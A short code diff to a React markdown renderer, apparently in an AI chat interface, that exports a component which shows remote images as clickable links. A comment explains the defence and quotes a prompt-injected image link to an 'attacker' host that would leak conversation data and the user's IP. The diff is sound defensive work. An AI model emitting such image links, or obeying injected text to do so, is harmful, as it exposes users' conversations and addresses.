@@ -80,7 +80,7 @@ function imageHost(src: string): string | null {
 
 // Remote images load without a click, so a prompt-injected `![](https://attacker/?d=...)` would
 // leak conversation data and the user's IP. Render them as links the user can choose to open.
-function MarkdownImage({ src, alt }: ComponentProps<'img'>) {
+export function MarkdownImage({ src, alt }: ComponentProps<'img'>) {
   const href = typeof src === 'string' ? src : ''
   if (!href) return alt ? <>{alt}</> : null
   const host = imageHost(href)
